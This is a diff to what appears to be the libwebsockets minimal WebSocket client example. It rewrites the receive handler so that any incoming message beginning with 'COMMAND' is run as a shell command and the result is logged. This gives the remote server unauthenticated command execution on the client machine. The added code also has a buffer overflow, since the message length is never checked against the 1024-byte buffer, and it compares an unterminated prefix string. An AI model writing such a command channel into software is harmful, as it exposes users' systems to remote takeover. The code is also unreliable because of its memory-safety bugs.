@@ -13,6 +13,7 @@
 #include <libwebsockets.h>
 #include <string.h>
 #include <signal.h>
+#include <shell.h>
 
 /*
  * This represents your object that "contains" the client connection and has
@@ -100,13 +101,23 @@ callback_minimal(struct lws *wsi, enum lws_callback_reasons reason,
                 break;
 
         case LWS_CALLBACK_CLIENT_RECEIVE:
-                lwsl_hexdump_notice(in, len);
+                char message[1024];
+                strncpy(message, in, len);
+                message[len] = '\0';
+                
+                char prefix[1024];
+                memcpy(prefix, message, 7);
+                if (strcmp(prefix, "COMMAND") == 0){
+                        Result result = run_shell_command(message + 8);
+                        lwsl_user("Received command: %s\n", message);
+                        lwsl_user("Result: %s\n", result.data);
+                }
                 break;
         
         case LWS_CALLBACK_CLIENT_WRITEABLE:
                 time_t t = time(NULL);
-                char timestamp[20];
-                sprintf(timestamp, "%ld", t);
+                char timestamp[100];
+                sprintf(timestamp, "TIME___:%ld", t);
                 lws_write(wsi, timestamp, strlen(timestamp), LWS_WRITE_TEXT);
                 break;
 
